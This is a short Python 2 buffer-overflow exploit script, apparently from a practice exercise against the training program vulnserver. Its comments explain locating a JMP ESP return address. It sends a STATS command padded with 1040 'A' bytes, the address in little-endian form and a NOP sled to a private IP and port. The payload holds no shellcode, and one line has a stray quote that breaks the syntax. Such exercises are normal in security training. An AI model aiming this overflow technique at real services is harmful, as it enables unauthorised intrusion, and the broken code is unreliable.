#!/usr/bin/python
import time, struct, sys
import socket


# at this point we have found the jmp esp with !mona modules and or !custom_search JMP ESP for vuln server
# we found vulnserver.exe which had all settings false at instruction address 0x65d11d71
# we have to add this to the offset as little endian //backwards like "\x71\x1d\xd1\x65"


#This number 6 is really just a place holder reminder that you need to do the steps to find the JMP ESP



cmd = "STATS "
buffer = "A"
padding = ""\x90"*16
offset = "\x71\x1d\xd1\x65"


print "Sending Evil Buffer!"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('10.11.4.94', 5555))
s.recv(1024)
s.send(cmd+(buffer*1040)+offset+padding)
s.close()